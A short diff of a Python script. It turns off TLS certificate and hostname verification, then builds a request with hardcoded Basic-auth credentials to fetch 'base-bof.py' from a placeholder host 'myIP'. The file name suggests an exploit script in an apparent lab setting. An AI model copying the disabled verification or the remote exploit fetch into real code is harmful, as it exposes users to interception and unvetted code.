@@ -125,7 +125,9 @@ import urllib.request
 import base64
 import ssl
 
-gcontext = ssl.SSLContext()
+gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+gcontext.check_hostname = False
+gcontext.verify_mode = ssl.CERT_NONE
 request = urllib.request.Request('https://myIP/base-bof.py')
 base64string = base64.b64encode(bytes('%s:%s' % ('testuser', 'Sup3rP4ss!'),'ascii'))
 request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
